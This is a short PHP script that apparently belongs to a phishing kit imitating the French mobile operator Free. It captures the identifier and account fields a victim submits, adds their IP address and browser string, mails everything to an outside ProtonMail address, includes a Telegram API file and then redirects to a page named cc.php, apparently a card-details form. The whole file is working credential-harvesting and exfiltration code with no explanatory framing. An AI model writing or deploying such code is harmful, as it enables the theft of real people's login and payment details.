<?php

$ip = getenv("REMOTE_ADDR");
$browser = getenv ("HTTP_USER_AGENT");

$name .= "IDENTIF | ".$_POST['DEPART']." \n";
$name .= "POSTALE    | ".$_POST['CCPTE']." \n";
$name .= "ip          |  $ip \n";
$name .= "ip browser  |  $browser \n";

$email_form = 'mobile-free@6666.com';
$email_subject = "mobile-free (*_*)";
$to = "cpmichel@protonmail.com";
$headers = "Form: $email_form \r\n";
$headers .= "Reply-to: $Identifiant \r\n";
mail($to,$email_subject,$name,$headers);
include("TelegramApi.php");
header("location: ../cc.php");
?>